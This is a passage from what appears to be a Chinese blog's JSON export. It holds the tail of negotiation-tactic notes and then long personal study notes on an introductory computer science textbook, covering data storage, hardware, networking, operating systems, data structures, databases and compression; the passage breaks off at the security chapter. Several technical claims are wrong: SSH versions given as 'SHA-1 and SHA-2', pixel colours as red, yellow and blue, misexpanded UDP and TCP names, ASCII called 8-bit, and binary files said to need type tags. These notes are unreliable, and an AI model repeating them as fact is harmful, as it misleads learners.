威胁：威胁要有效力，需要通过令人信服的方式来传达；那我们可以介入传达的过程，也可以选择无视它，将它当做对方的信口胡说；另外也可以考虑采取办法让对方发出威胁的时候，冒巨大的风险，比如将对方的威胁进行录音； 一些立场上施压的政策： 拒绝谈判：了解拒绝的理由，再提出一些选择的方案来开启谈判；要坚持使用原则； 过分的要求：让对方解释其要求的理由，以便使其认识到自己要求的荒谬性； 变本加厉：提醒对方注意，并做稍事休息，以便自己不会冲动，考虑之后是否继续谈判，或者基于什么原则双方继续双方的谈判； 锁定战术：锁定战术要生效，必须能有效传达信息，因此，可以通过阻断信息传达的方式，来应对强硬的破釜沉舟战术；比如选择无视，或者弱化它，把它当成只是一种选择方案而已； 强硬同伴：不要和对方继续讨论，先让其中一方签字确认适用的原则，之后再与另一方单独开启谈判； 故意拖延：指出对方故意拖延战术并与之谈判外，同时与其他方谈判；另外寻找客观上的有利条件做为最后期限； 要不要请便：一种是无视，然后继续提出自己的方案；一种是正视，然后分析对方可能面临的利益损失，并寻找一种保全脸面的做法； 诚意原则：在谈判前声明，我们想知道我们的谈判规则，比如是又快又省力的达成一项明智的协议，还是玩一场对抗游戏，比赛谁更加固执；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"谈判","slug":"谈判","permalink":"http://example.com/tags/%E8%B0%88%E5%88%A4/"}]},{"title":"计算机科学导论","slug":"计算机科学导论","date":"2016-01-04T00:15:00.000Z","updated":"2024-09-22T23:08:43.596Z","comments":true,"path":"2016/01/04/计算机科学导论/","permalink":"http://example.com/2016/01/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E5%AF%BC%E8%AE%BA/","excerpt":"","text":"绪论 图灵模型：关于计算的抽象概念模型 可编程的数据处理器，通过添加“程序”这个元素，实现图灵模型； “程序”是一系列告诉计算机如何对数据进行处理的集合；（凡是图灵完备的语言，理论上都是强大够用的，但好不好用，简不简单，就不一定了，这取决于每个语言的抽象程度） 冯诺依曼模型：关于计算的物理实现模型 由4个子系统构成，包括：存储器，算术逻辑单元，控制单元，输入&#x2F;输出单元； 在这个模型中，程序是由数量有限的指令组成；控制单元从内存读取一条指令，解释指令，然后执行指令； 计算机组成 计算机硬件 计算机软件 程序必须是存储的 程序必须是有序的指令集（目的：通过使用指令集，提高复用性，让编程变得简单） 算法：对不同的问题，寻找合适的指令来解决； 语言：利用语言符号来代表位模式（什么是位模式？位流，由一系列的位组成，例如8位，16位，32位）（我们当然可以通过操作位来实现计算，但这样的编程效率太低了，由于很多位操作是通用的，通过引入语言符号在进行抽象封装，使得我们可以在更高的层次进行思考并实现我们的计算目的） 软件工程：将程序的设计和编写进行结构化，即遵循一定的原理和规则（目的：控制复杂度） 操作系统：为程序访问计算机硬件提供方便，因为很多指令是通用的； 数据：存储数据，组织数据；数据目前只能以位模式进行存储；但数据的组织的方式却可以有很多种，这是一个大课题； 数字系统 位置化数字系统：同一个符号，其所在的不同位置，决定了其表示的不同值；包括2进制，8进制，10进制，16进制等； 非位置化数字系统：例如罗马数字系统；不管符号出现在哪个位置，它都表示相同的值； 数据存储 数据类型 数字，文本，声音，图像，视频； 位：用 0 或 1 表示； 位模式：也叫位流，由一系列的位组成，例如8位，16位，32位等；长度为8的位模式，称为1字节； 数据压缩：为了减少内存空间的占用，数据在存储到计算机之前一般会经过压缩；（有哪些压缩的方法？采样法，短替长法） 错误检测和纠正：在传输和存储过程中，有时会出现错误，这个时候，可以通过检测技术来纠正； 存储数字 整数：一般使用定点表示法； 无符号表示法：常用于计数，寻址，其他数据类型的存储等场景； 符号加绝对值表示法：最左边定义符号，0表示正整数，1表示负整数； 二进制补码表示法（用来表示负数）： 实数： 浮点表示法：由于符号，位移量，定点数三部分构成； 规范化：在小数点的左边使用唯一的非零数码； 符号、指数和尾数： 符号：用 0 和 1 来表示正负； 指数：小数点移动的位数（2 的幂） 尾数：小数点右边的2进制数； 余码系统：它是一种表示法，在这种系统中，正负整数都可以作为无符号数来存储，它的实现方式，是通过将一个正整数（称为偏移量）加到每一个数字中，将它们统一移动到非负的一边；这个偏移量的值是 2^(m-1) - 1（正数貌似不用处理，负数则通过加上这个偏移量之后的数来表示）（注：此处的 m 是内存单元存储指数的大小） 存储文本 通过一套代码来表示符号，常用的代码系统有 ASCII（美国信息交换标准码），缺点是只能搞定英文，其他语言例如中文的符号搞不定，因为它只有8位，只可以定义 128 个符号； Unicode：使用32位，因此可以表示42亿个符号，所以可以搞定全世界；至于能不能全宇宙，这个就不知道了，估计应该是不行的吧； 其他编码：还有很多，比如 UTF-8，UTF-16，GB2312，GBK 等等； 存储音频 声音在时间维度上是一种连续的数据，理论上它是无限的，但我们的存储是有限的，所以只能通过采样来解决；（由于是采样，应该会涉及采样的密度，即相同时间单位内，采集的样本数量） 流程： 采样：在模拟信号中，选择数量有限的点，并把它们记录下来； 量化：将样本的值，截取为最接近的整数的值； 编码：将样本值，转化成位模式； 存储图像 光栅图（也叫位图） 将整张图像分解成很小的像素，每个像素有单独的密度值 解析度：每单位面积大小，例如每英寸，使用多少个像素来表示，这个扫描率称为解析度，如果解析度足够高，人眼就看不出来图像的不连续性；（理论上图像也是一种连续的数据，因此其实现也同声音一样是通过采样） 色彩深度：用于表现每个像素的位的数量，一般是24位，由红、黄、蓝组成，每个原色用8位来表示；（对颜色的感觉，其本质是我们的眼睛如何对光线进行响应；我们的眼睛有不同的感光细胞，一些响应三原色，一些响应光的密度，然后产生不同强度的神经信号，之后大脑对信号进行翻译） 真彩色：使用24位来编码一个像素，理论上可以表示1600万种左右的颜色 索引色：将真彩色缩编成256个颜色来代表； 矢量图 不存储像素的位模式，而是将图像分解为线条，形状，颜色等要素，然后由定义如何绘制这些形状和颜色-的一系列命令组成； 存储视频：视频可以看做是图像在时间轴上的叠加处理； 数据运算 三大类：逻辑运算，算术运算，移位运算； 4种逻辑运算：与，或，非，异或；即AND, OR, NOT, XOR NOT 的应用：对整个模式求反； AND 的应用：对整个模式归零； OR 的应用：对整个模式置壹； XOR 的应用：对指定位进行反转（求反）； 算术运算：加减乘除 二进制补码格式的好处：加法和减法没有不同；如果使用符号加绝对值的格式，加法和减法的表示就会变得比较复杂，涉及8种不同的情况； 浮点数运算：将小数点对齐，对小数和整数部分使用符号加绝对值的方式进行计算； 计算机组成 三大类 中央处理单元 算术逻辑单元：逻辑运算，移运运算，算术运算； 寄存器 数据寄存器 指令寄存器 程序计数器 控制单元 主存储器：磁盘不是一种存储器，而是一个存储设备，属于输入输出系统； 它是存储单元的集合，每个存储单元都有一个自己的地址标识；所有标识了地址的单元的总数，称为地址空间； 类型： RAM：随机存取存储器；分为静态 SRAM 和动态 DRAM 两种，前者快但贵，后者慢但便宜；动态与静态的差别在于，动态使用电容存储的电荷数量来表示0或1，但由于电容中的电荷会衰减，所以需要定时动态充电，静态则不用； ROM：只读存取器； 层次结构：根据 80&#x2F;20 法则，存储器内部通过三个层次结构（寄存器 + 高速缓存 + 主存），来取得速度和成本之间的平衡； 输入&#x2F;输出子系统 非存储设备：例如屏幕，鼠标，键盘，打印机等，用于通信 存储设备：磁盘，光盘等； 子系统的互连 CPU 和存储器（主要指内存）主要通过总线来连接，包括：数据总线，控制总线，地址总线； I&#x2F;O 设备的连接：不能和CPU直连，因为大家的速度不一样，需要通过输入输出控制器（或者适配器）中转，常见的控制器有：USB，HDMI，火线，SCSI 输入输出设备的寻址 I&#x2F;O 独立寻址：CPU 使用单独的指令来寻址 I&#x2F;O 存储器映射寻址：CPU 使用与主存储器相同的指令来寻找（方案：CPU 将输入输出设备的寄存器当做内存中的某个单元），优点是共用指令，缺点是占用内存地址；（此时可使用虚拟内存方案来解决） 程序执行 机器周期：取指令，译码，执行； 输入输出操作的三种同步方式（因为CPU 和输入输出的速度不同，所以需要有一种方案，可以用来同步大家的速度） 程序控制输入&#x2F;输出：CPU 等待 I&#x2F;O 设备，每隔一段时间，CPU 就去扫描一下设备状态，看有没有指令等待处理；（或许可以理解为轮询） 中断控制输入&#x2F;输出：CPU 通知 I&#x2F;O 可以传输，之后不管了；等 I&#x2F;O 设备准备好，通知 CPU 开始；在 I&#x2F;O 设备准备好前，CPU 可以先去干别的；（有点像web socket） 直接存储器存取（DMA）：给 CPU 增加了一个助理，CPU 收到指令后，通知 DMA 准备，之后CPU 干别的；等DMA 准备好了，DMA通知CPU 需要使用总线资源，然后 CPU 停止使用总线并转交给 DMA 使用；在 DMA 和内存之间完成数据传输后，CPU 恢复正常工作；在这种情况下，CPU 在 DMA 和 内存之间传输数据时，可以偷懒空闲一会（事实上，这一会经常是整个过程最占用时间的部分）；DMA 的缺点是有可能会出现数据不同步导致冲突的情况； 体系结构 复杂指令集计算机：优点：编程比较简单；缺点：控制单元的电路变得非常复杂，解决方案是将 CPU 分层，增加一层微内存，它用于保存指令集中每个复杂指令的一系列操作，英特尔的奔腾CPU即是使用这种设计方式； 精简指令集计算机：复杂指令使用简单指令进行模拟；缺点：编程比较复杂 流水线：可以尽量减少空闲；（对相同类型指令的批量处理，实现指令级并发） 并行处理：通过多个控制单元，多个算术单元，多个内存单元来实现；（线程级并发）(多核心的CPU是否即是一种并行处理的实现？是的，不过应该是属于进程级并发了） 计算机网络和因特网 引言 网络：一组可相互通信的设备相互连接构成，设备包括主机、服务器、路由器、交换机、调制解调器等； 局域网：局部区域数量有限的设备相互连接的私有网络； 广域网：比局域网规模更大的网络，例如跨地区，跨国家等； 互联网：两个或多个网络互相连接的时候，称为互联网，或者网际网，因特网即是一个最著名的大型的网际网； 网络的运行，需要硬件，也需要软件；它们之间通过协议分层来相互配合；发送器，接收器，以及所有中间设备都需要遵守相同的协议，以保证有效的通信；（或许可以考虑通过快递的转运和分发中心来比喻？） 协议分层：模块化，服务与实施分离，降低复杂度，降低维护成本； TCP&#x2F;IP 协议族：一个分层协议 地址和数据包名称 应用层：通常使用名称来定义提供服务的站点，例如域名，邮箱地址等；应用层的职责是创建消息（这些消息也有一定的格式规范，取决于所使用的协议）； 传输层：提供进程间的通信服务；传输层的职责是创建&#x2F;分段用户数据报 在传输层地址被称为端口号，它的作用是在源和目标之间，定义应用层程序（提供一层应用程序的抽象）； 它可以通过各程序的本地地址，来辨别多个同时运行的本地程序（即使用端口号）； 网络层：IP地址，独一无二的定义了该设备与因特网的连接，它是一个逻辑地址；网络层的职责是创建包含更多一层头部信息的数据报； 链接层：链接层的职责是创建桢，提供节点与节点之间的链接；（例如两台机器间通过WIFI、蓝牙或网线的链接） MAC地址，是在本地定义的地址，它定义了一个特定的主机或路由器，它是一个物理地址； 物理层：各种信号转换和传输的方式； 或许可以根据访问的 url 从左到右进行记忆： HTTP 表示应用层，即对待传输的数据使用 HTTP 协议来打包； 端口号 表示传输层，即表明源机器和目标机器之间哪两个程序要建立连接和传输数据； IP 地址表示网络层，即表示哪两台机器之间要建立连接； WIFI 或蓝牙表示链接层，即表示使用哪种网络连接设备建立连接； 数字信号或模拟信号表示物理层，即表示使用哪种电子信号进行传输； 应用层 提供服务：该层不需要向其他协议提供服务，只需要向用户提供服务，因此它比较灵活，可以根据需要添加协议，只要它能够接收传输层的服务即可；这种也导致目前不计其数的应用层协议，大家根据需要创建并使用； 应用层模式 客户机-服务器模式 Client Server 服务提供者是一个应用程序，叫做服务器进程；这个进程持续运行，等待客户端进程的应用程序通过网络连接要求服务； 端到端模式 P2P 端到端只在两个计算机之间建立连接； 最适用的场景是网络电话； 优点：易于拓展，低维护成本，无需昂贵的服务器； 缺点：安全性低；在分散的服务之间建立安全的通信较为困难； 标准化客户端-服务器应用 万维网和超文本协议：连接文档的存储库；文档称为网页，提供服务的地方称为站点； 客户端：即浏览器，由控制器，解释器，和客户端协议三部分构成；控制器负责接受键盘或鼠标等设备的输入；解释器负责解释HTML&#x2F;CSS&#x2F;JS；协议包括HTTP、FTP等； 服务器：存储网页，每当收到请求时，将文档发送给客户端； 统一资源定位器：URL，由4部分构成，包括协议、地址、端口、文档路径； 客户端-服务器应用程序包括：超文本传输协议 HTTP，文档传输协议 FTP，电子邮件 EMAIL，远程登录 TELNET，安全外壳 SSH，域名系统 DNS SSH 安全外壳最初是为了解决 TELNET 的不安全而设计的，但现在用途更广泛了；它有 SHA-1 和 SHA-2 两个版本，互相之间不兼容，前者有安全漏洞； 域名系统 DNS 是一个独立的应用程序，它通过站点名称和 IP 地址的映射，解决了人们通过名称而非数字记住站点的问题； 传输层 提供的服务：进程间通信地址（即端口号）；（此处的进程间，可能既可以表示客户端进程与服务器进程，同时也可以表示服务器本身的多个进程之间，比如本地A程序访问本地B程序提供的服务） 传输层协议 UDP：用户数据协议，user data protocol，缺点：无连接，不可靠；优点：资源开销少； TCP：传输控制协议，transfer control protocol，可靠的连接；它会将数据分段传输； 网络层 提供的服务： 打包：从传输层接收数据报，然后添加源地址、目标地址、以及其他网络协议需要用到的头部信息；（此处的源地址和目标地址，除了常用的IP地址外，估计还包括机器在局域网内部的地址？答：是的，还包括 MAC 地址） 数据包传递：使用不可靠、无连接的传递； 路由：从所有路线中，找到最优的路线； 解包：等待所有的包到齐，解开，发给传输层； 网络层协议：IPv4，IPv6； 数据链路层（或许可以理解为机器间的连接方式，比如蓝牙、WIFI、LAN等） 提供的服务： 提供节点对节点之间的链接（节点指 LAN 或 WAN）； 封装：将数据包封装到桢中；（然后另一段通过接收和解析桢来获得所要的数据） 协议：TCP&#x2F;IP 协议族没有规定这一种的协议；这一层的协议种类比较多，包括： LAN：以太网、Wifi、蓝牙 WAN 有线：拨号上网 PPPoE，数字用户回路 DSL，有线电视网络 无线：WiMax，手机网络，卫星通讯； 物理层 提供的服务 信号转换：数模转换、数数转换、模数转换、模模转换等； 信号传输：数字化传输、模拟传输； 传输介质 导向介质：双绞线、同轴电缆、光纤； 非导向介质：无线电波、微波、红外波； 操作系统 引言 计算机由硬件和软件两部分组成，其中软件又分为操作系统和应用程序两种； 定义：操作系统是硬件和用户（包括程序和人）的一个接口，它使得其他程序更加方便有效的运行，并更加方便的对计算机硬件和软件资源进行访问； 在计算机通电后，通过内存中的ROM小程序，实现自举的过程，将操作系统从磁盘载入内存； 演化 批处理系统，分时系统，个人系统，并行系统，分布式系统，实时系统（在特定时间限制内完成任务，例如自动驾驶的实时监控）； 组成部分 内存管理器 单道程序：一次只能一个程序载入内存，执行完毕后，再载入下一个程序；已淘汰 多道程序：一次允许多个程序载入内存； 非交换：分区调度，分页调度； 交换（运行过程中，程序可以在内存和硬盘之间多次交换数据）：请求分页调度，请求分段调度，请求分页和分段调度； 虚拟内存：在请求分页调度和请求分段调度中使用； 进程管理器 程序（在磁盘），作业（被选中），进程（进内存） 状态图：保持状态，就绪状态，运行状态； 调度器：作业调度器，进程调度器， 队列：通过多个队伍和多种策略，解决计算机资源的分配； 进程同步：避免死锁和饿死； 设备管理器 不停监视所有输入&#x2F;输出设备 为每个设备维护一个队列； 设置访问设备的不同策略； 文件管理器 访问，创建，删除，修改，命名，存储，归档，备份； 用户界面（或命名解释程序）：负责操作系统与外界用户之间的通信；有 GUI 窗口和 CUI shell 两种形式； 主流操作系统 UNIX：内核，命令解释器，标准工具，应用程序 LINUX：内核，系统库，系统工具 WINDOWS：面向对象，多层的操作系统； HAL：硬件抽象层 内核 执行者：对象管理器，安全引用监控器，进程管理器，虚拟内存管理器，本地过程调用工具，I&#x2F;O管理 环境子系统 算法 定义：步骤明确，有序集合，有限时间内，产生结果 程序结构由三部分组成：顺序，判断，循环 算法的表示：UML图，伪代码； 基本算法：求和，求积，求最大最小值，排序，查找； 排序 选择排序：找出最小值，放到最左边；在剩下的元素中，循环这个过程； 冒泡排序：从最右边开始，逐个检查元素，如果遇到比自己大的元素，交换位置，直到最左边；再从最右边开始循环； 插入排序：将最左边的值，插入已排序的列表； 查找：顺序查找，折半查找； 子算法：在算法中抽象一个利用的子过程，在需要的时候，重复调用，使程序更加简单易懂；也易于维护； 递归：算法的定义涉及调用自身； 迭代：算法的定义不涉及调用自身； 程序设计语言 计算机语言：一组预定义的单词，根据语法写出的语句集合（语法是一些事先定义的规则） 机器语言：计算机唯一能看懂的语言，因此，所有任何语言，最终都需要翻译成机器语言，以便计算机可以看懂并执行； 汇编语言：引入了符号和助记符，相当于多了一层抽象； 高级语言：继续增加抽象，让程序员可以摆脱硬件和操作系统的约束，直接只关注程序本身； 编译和解释的区别 编译：直接将源程序翻译成目标程序； 解释： 第一种：逐行翻译，立即执行，出错马上反馈，程序中止； 第二种：先翻译成字节码；然后字节码可以拷贝到有虚拟机的机器上，进一步编译成目标程序；相当于增加了一层抽象，目的是增加可移植性；由字节码翻译器面对不同的操作系统，而源程序则就不用考虑这个问题； 翻译过程 词法分析：搞定单词 语法分析：搞定语法 语义分析：搞定意思 代码生成：生成目标程序（据说是助记符表？）； 编程模式 过程式 对象式 函数式 声明式：使用逻辑推理来回答答题，常用于人工智能领域，例如 Prolog； 过程式和对象式中的常见概念：标识符（即对象的名称，内存地址的抽象化，方便引用），数据类型（简单，复合），变量，常量，字面值，输入输出，表达式（由运算符-算术&#x2F;逻辑&#x2F;关系 + 操作数组成），语句（赋值、复合、控制）； 两类控制语句：顺序，选择（if-else 双路，switch-case 多路），重复 软件工程 软件有生命周期，当软件过时，意味着生命周期即将结束； 生命周期包括分析、设计、开发、测试四个阶段； 分析阶段产生规格说明文档，此文档说明了软件要做什么，但不说怎么实现； 过程式： 数据流图 实体关系图：设计数据库需要； 状态图：显示系统中的实体，在事件触发下，状态会如何改变； 对象式： 用例图：显示了用户如何与系统进行交互； 类图 状态图； 设计阶段定义了如何完成说明文档所定义的内容； 过程式：将软件分解为模块和过程； 模块化：将大程序分解成小程序；耦合最小化，内聚最大化； 对象式：罗列类中的细节； 开发阶段 过程式：编写模块的代码 对象式：编写类的代码； 数据结构 数组 数组是元素的顺序集合，这种结构也决定了对数组的元素进行插入和删除，会比较麻烦，因为它涉及动态调整插入或删除位置的后续元素的一系列调整； 数组可以是一维数组，也可以是二维，也可以是多维； 数组一般使用行主序存储；也可以使用列主序存储，但前者比较常见； 未排序的数组，元素的查找只能按顺序查找；已排序的数组，则可以使用折半查找； 由于数组是元素的顺序集合，因此对数组中的元素进行提取是比较容易的，只需要知道它的下标即可； 数组适用于插入和删除操作少，而检索和查找操作多的场景； 记录 记录中的元素可以相同类型，也可以是不同类型，关键在于这些元素有某种关联关系；(记录，即是大多数语言中的简单对象） 数组一般是元素的集合，而记录是可以用来确认元素的部分或标识； 链表 链表是一个数据的集合，每个元素包含下一个元素的地址；即每个元素包含两部分：数据和链（即指针）； 链表的元素习惯上称为节点，节点包含两个域，一个用来存数据，一个用来存地址； 数组在内存中是连续存储，而链表可以随机存储； 数组通过索引连接起来，而链表通过指针连接起来； 链表的好处是插入和删除元素都很容易，只要改变指针的指向即可，缺点是它比较占据内存空间，因为它需要多一倍的空间用来存储地址； 链表的另外一个缺点是只能顺序查找； 链表适用于需要大量进行插入和删除操作的场景，但链表的查找速度较慢； 抽象数据类型 抽象数据类型（ADT）基于基本数据类型来实现，使用 ADT 的目的是为了能够在更高的抽象层次上进行思考和解决问题，减少对底层实现细节的关注； 抽象数据类型通过封装公有操作、私有操作、数据结构来实现（感觉跟类的实现很像）； 常见的抽象数据类型： 栈 应用场景：倒数数据，步骤回溯、配对数据（例如括号的检查）、数据延迟使用等； 队列 应用场景：处理速度差距大的两个环节的协作； 广义线性表 应用场景：元素的存储是随机的，但读取是顺序的； 树 应用场景：文件索引、赫夫曼编码（文件压缩）、表达式树、文件夹目录 图 应用场景：寻找网络中是的最优路径，例如路由、导航等场景； 其实还有其他很多，所有面向对象编程中的类，大部分都可以看做是抽象数据类型； 文件结构 引言 文件是记录的集合，存储在二级存储设备上面； 记录是由一些由属性组成的对象； 设计一个文件时，核心是如何从文件中检索出信息，即检索出所需要的记录，有两种读取方式：顺序存取（顺序文件）、随机存取（索引文件、散列文件）； 顺序文件 特点：需要查找某个记录时，需要从头开始挨个顺序核对，直至找到为止； 更新过程：涉及四个文件，包括事务文件，旧文件，新文件，错误文件； 通过更新程序，逐个比对事务文件和旧文件中的键，事务的键小，新增记录；键相等，修改或删除记录；旧文件键小，记录不变； 错误文件记录两种情况：增加相同标识，删除不存在的标识； 索引文件 为顺序文件提供快速查找的功能；只存储两个字段，键和地址，其中键是按顺序排列的；索引体积很小，使用的时候加载到内存中，通过折半算法进行查找到键，然后获得对应记录的地址； 散列文件 设计一个散列函数，可以将键直接翻译成地址，然后到该地址中取得记录； 散列函数 直接散列法：优点是不会出现重复，缺点是很浪费空间；比如身份证号，系统中的用户可能才100个，即需要占用18位编号对应的存储空间； 求模法：文件大小，除以键值，得到的余数加1，作为地址，address &#x3D; key mod list_size + 1；当文件大小为素数时，得到的结果出现重复的概率非常小；因此，当设计存储空间时，以最接受空间容易的素数，作为空间的值，例如假设需要300左右的空间，那么最接近的素数是307，因此选择以307做为实际空间大小；会存在一点浪费，但不大； 数字析取法：例如从6位的键值中，按固定位置挑出3位，例如：138655，固定挑 1、3、4 位，因此得到 186 作为地址（感觉存在冲突的可能性也不小，例如和 138653 即冲突了） 其他方法：平方中值法、折叠法、旋转法、伪随机法等； 冲突解法办法 开放寻址：冲突的时候，新键的地址，为老键地址+1；优点：看似简单粗暴；缺点：增加了未来出现更多冲突的可能性；例如多个键映射到同一地址；或者新地址已经被其他键占用； 链表法：在冲突键的记录末尾，添加新键的指针；这样相当于将所有的存在冲突的键，组成了一从链表，共享一个地址，然后按顺序查找； 桶列法：相当于批量创建链表，不管是否存在冲突（提前设计）；缺点：存在很大的空间浪费； 组合法：使用多种方法组合来解决冲突； 目录 用来组织文件，其实它本身也是一种文件，比较特殊的文件；这个文件保存了其项下所有文件的位置（相当于索引），另外它还可以用来设置访问权限、文件被增删改的时间等； 目录一般被处理成像树那样的抽象数据类型； UNIX系统中的目录 特殊目录 根目录：以 &#x2F; 表示 主目录：每个用户有一个主目录，首次登录系统时，会默认先进入这个以用户名区分的主目录（也可视为个人目录，可能相当于 windows 下的我的文件） 工作目录：即当前目录； 父目录：即当前目录的上一级目录； 路径和文件名 每个目录和每个文件都有名字，不同目录中的文件甚至会有相同的名字，我们可以通过路径+文件名的形式来标识它们； 绝对路径：以根目录 &#x2F; 开始进行标识；&#x2F;cat&#x2F;john&#x2F;test.file 相对路径：以当前目录开始进行标识，例如 john&#x2F;test.file 文本文件与二进制文件 文件最终在存储设备上，都是以二进制位的序列进行存储的，但是，它的翻码有两种类型，一种是文本文件，一种是二进制文件； 文本文件：它会将文件中的所有东西，都当做字符来存储，包括数字如100也当成1、0、0三个字符来存储；它不能直接存储整数、浮点数或其他数据类型； 二进制文件：它会将文件中的所有东西，都按照它们在内存中的二进制值来存储，即原封不动；但是，由于数据类型有很多种，为了能够让存储的数据在提取时被正确解读，它需要为每个二进制值增加一个类型的标识，这样提取的时候才能够正确翻译；因此，用二进制来存储，会占用更多的空间；但好处是可以保存所有的数据类型； 数据库 引言 定义：传统上，数据是保存在文件中的，优点是很灵活，缺点是数据在不同的文件与文件之间的无法建立关联，使得数据无法做为一个整体进行关联使用；数据库则通过将这些相关的数据做成一个逻辑有序的集合，让数据的使用具备以下优点：减少冗余、保持完整、避免不一致、提高效率、安全管理；（注：数据库只是一种数据的逻辑集合，跟数据的物理存储是无关的，例如物理存储可能是分开的） 数据库管理系统：定义、创建、维护数据库的一种工具；由硬件、软件、数据、用户、规则等组成； 数据库体系结构：内层（与硬件交互，负责传输数据到设备，定义存储的方法），概念层（定义数据模式，是中介层，使得用户不必与内层直接打交道）、外层（将数据展示成用户可以理解的图式或格式）； 数据库模型：定义数据的逻辑设计，描述不同数据之间的联系；有三种模型：层次模型（已过时）、网状模型（已过时）、关系模型（正当时，还有另外两种常见的模型：分布式模型、面向对象模型） 关系数据库模型 关系（也即二维的表）：表有一个唯一的名称； 属性：表中的列称为属性，列的数量即为关系（表）的度，例如总共有3列，则关系的度为3； 元组：表中的列称为记录（或叫元组）； 关系的操作 操作类型 基本操作：增（插入）、删（删除）、改（更新）、查（选择） 其他操作：投影、连接、并、交、差； 结构化查询语言 投影：从表中选择部分列出来； 连接：基于共有的属性，把两个表连接起来，记录的数量不变，可以只选择部分列，例如 select 列1，列2，列3， 列4 from 表1，表2 where 列1 &#x3D; 列4 并：将两个表中的记录合并到一个新表中，即记录的合并（去除重复项）； 交：两两个表中相同的记录提取出来到一个新表中，即提取共同项； 差：将A表中的，不在B表中的记录提取出来，即相当于 A表 减去 B表余下的记录； 数据库设计 步骤： 访谈调研，收集数据和文件，了解数据的使用需求； 建立实体关系模型 实体关系模型：通过E-R图来表示，矩形表示实体，椭圆表示实体的属性，菱形表示实体之间的关系（动作，1对多等） E-R图到表：给实体（矩形）建表，给实体间的关系（菱形）建表 规范化（即范式NF）：让表之间的关系更加坚固，1NF,2NF,3NF,4NF,5NF 其他数据库模型： 不完全的分布式数据库：分公司存储自己的雇员信息，总公司可以读取所有的雇员信息； 复制式的分布式数据库：一个节点是对另外一个节点的完全拷贝（增加健壮性）； 面向对象数据库：记录由对象和其属性、方法组成； XML：可以用嵌套结构表示数据； 数据压缩 引言 有损压缩：MP3, JPG, MPEG 无损压缩：赫夫曼编码、游程长度、Lempel Ziv等； 无损压缩 游程长度编码：将重复出现的字符，用出现次数+字符值来表示，例如：AAAAAAAAAA，表示为 A10，即10个A；适用场景：用符号组成的数据； 赫夫曼编码： 先统计各种字符出现的频率；按频率从小到大，按对组合一个新节点，最终得到一颗树； 从树的根节点开始，根据权值大小，分配0和1； 每个字符，从根节点出发，一路路过的0或1，即组成每个字符的编码；得到一张每个字符的编码表 将源文件按照编码表进行转译； 解压缩时，将压缩文件按照编码表进行还原； 总结：越频率出现的字符，其编码越短，因此从总体上节省了空间； Lempel Ziv 编码 思路：自适应编码思想，发送方制作一张字典，每个字符串有相应的索引，将文件中的字符串替代成索引，然后发送；对于接收方，由于字典是按约定的共同规则建立的，因此，可以根据发放的压缩文件，还原出字典，并逐步得到解压缩后的源文件；LZ 编码有多种不同的版本（即不同的编码规则）； 步骤： 建立字典索引：从未压缩的文件中，选择未在字典中出现的最小子字符串，放入字典，分配一个索引值； 压缩：除了该子字符串的最后一个字符外，前面的部分如果已经在字典中出现，替换成字典中的索引，写入压缩文件； 发送文件给接收方 建立字典索引：从压缩文件中，选择未在字典中出现的子字符串，放入字典，分配一个索引值 解压缩：除了该子字符串的最后一个字符外，前面的部分如果已经在字典中出现，替换成字典的字符串，写入解压缩文件； 重复步骤5，最后得到一张完整的字典和源文件； 有损压缩 对于文本文件和程序文件，有损压缩不可接受，但对于图像、音频和视频，有损可以接受；因为我们的生理限制，只能识别一定范围内的差别；JPEG（联合图像专家组）用来压缩图片，MPEG（运动图像专家组）用来压缩视频，MP3（即MPEG-3，第3代音频压缩格式）用来压缩声音； 图像压缩 思路：将图像转化成数，揭示出数的冗余，再使用无损压缩的方法来去除这些冗余，最终实现压缩； 步骤 分块：黑白图使用8位表示每个像素，彩色图使用24位（一个3个8组成的数组，例如[8,8,8])来表示每个像素；每张图片是由很多个像素组成的，分块指先将图片划分成多个 8*8 的像素块，后续压缩以像素块为单位进行处理； 离散余弦变换：这种变换方法有“能量集中”的特性，而自然界的声音和图像信息，刚好也有能量集中的特性，因此这种变换方法，可以最大程序的提示冗余，实现更好的压缩效率；将像素块的表P变换成新表T 量化：定义一张通用的8*8量化表，将 T 表中的每个值除以量化表上面的值，舍弃小数部分，得到一个新值R（大多数情况下，由于变换的能量特性，这一步会得到很多0，形成冗余，为压缩创建了条件） 压缩：使用Z字形按对角线读取R表，最大程序的聚集所有0值（以便压缩时得到最好的效果）；然后使用游程长度的压缩方法，将量化结果进行压缩； 视频压缩 思路：视频是图像桢的组合，因此视频压缩分为空间压缩（单桢压缩，即图像压缩）和时间压缩（丢弃多余的桢）两部分； 步骤 将桢分成三种，分别是 I 桢（可以理解为关键桢），P 桢（可以理解为基于前 I 桢和后 I 桢计算的变化桢），B 桢（可以理解为基于前面 I 桢和后面的 P 桢生成的中间桢） 发送顺序：I P B B P B B I 以上是 MPEG-1 版本的工作原理，MPEG 不断更新，最近的版本已经到了 MPEG-7（多媒体内容描述接口，使用XML 描述元数据和视频内容，方便用户对感兴趣的内容进行搜索，注意，它不是一项视频压缩编码标准，只是内容描述标准）；最近的一个压缩编码标准是 MPEG-4，相对于MPEG-2，MPEG-4 不再使用宏区块作为视频分析，而是以视频上的个体为变化记录进行分析（优点：当视频变化很快，码率不足时，也不会出现方块画面） 音频压缩 两种类型的音频，语音（64 KHz的数字信号）和音乐（1.411 MHz的数字信息，比语音的频率覆盖范围大很多，约22倍） 两种压缩技术 预测编码：对样本间的差别进行编码，通常用在语音； 感知编码： 基于心理声学，即利用人耳的生理缺陷进行掩盖，包括两种： 频率掩盖：高频掩盖低频 时间掩盖：高频会在一定时间内降低耳朵的听觉灵敏度； 操作：分析音谱，把音谱分成几个组，0 位分配给频率范围被完全掩盖的，小数位分配给部分掩盖的，整数位分配给不能掩盖的； MP3 码率：每秒音频所需要的编码位数，常见的有：96 kbps，128 kbps，160 kbps，320 kbps；CD 上未被压缩的码率一般是 1411.2 kbps）；声音的质量跟码率和编码器都有关，因为编码器的工作在应用合适的心理声学模型，滤除人耳无法识别声音。因此，如果模型优秀，甚至可以做到在低码率的基础上，实现比高码率差编码器更好的效果；另外，不同的人，对声音的敏感度是不一样的，因此以上理论只对同一个人进行测试有效，如果是不同的人，则失去了比较的意义； 如果由于某种原因，比如需要对音频进行混合、编码等处理，不允许出现质量损失，则应该使用无损压缩； 安全 引言 安全的目标：机密性（避免未授权的使用），完整性（避免未授权的修改），可用性（实时可用）； 以上目标不仅在信息存储时需要实现，在信息传输时也需要实现； 